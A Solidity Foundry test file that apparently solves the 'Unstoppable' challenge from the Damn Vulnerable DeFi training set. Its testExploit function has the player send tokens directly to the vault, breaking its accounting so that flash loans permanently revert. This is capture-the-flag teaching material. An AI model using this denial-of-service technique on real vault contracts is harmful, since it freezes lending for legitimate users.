// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/DamnValuableToken.sol";

import "src/unstoppable/ReceiverUnstoppable.sol";
import "src/unstoppable/UnstoppableVault.sol";

// Challenge #1 - Unstoppable
// https://www.damnvulnerabledefi.xyz/challenges/unstoppable/

contract Attack is Test {
    DamnValuableToken public token;
    UnstoppableVault public vault;
    ReceiverUnstoppable public receiverContract;

    address public deployer = 0xC8cE76531d914775C3f203eDd37E0cD42Ede2fa1;
    address public hacker = 0x4A6f6E8A8433e06cb3ce41BE74Ba4bcb074C6282;

    uint256 public constant TOKENS_IN_VAULT = 1000000 * 10e18;
    uint256 public constant INITIAL_PLAYER_TOKEN_BALANCE = 10 * 10e18;

    function setUp() public {
        token = new DamnValuableToken();
        vault = new UnstoppableVault(ERC20(address(token)),deployer,deployer);

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);

        token.transfer(hacker, INITIAL_PLAYER_TOKEN_BALANCE);

        receiverContract = new ReceiverUnstoppable(address(vault));

        receiverContract.executeFlashLoan(100 * 10e18);
    }

    function testInit() public {
        assertEq(address(vault.asset()), address(token));
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000 * 10e18);
        assertEq(token.balanceOf(hacker), INITIAL_PLAYER_TOKEN_BALANCE);
    }

    function testExploit() public {
        // Attack Code:
        vm.startPrank(hacker);
        token.transfer(address(vault), token.balanceOf(hacker));
        vm.stopPrank();

        vm.expectRevert();
        receiverContract.executeFlashLoan(100 * 10e18);
    }
}
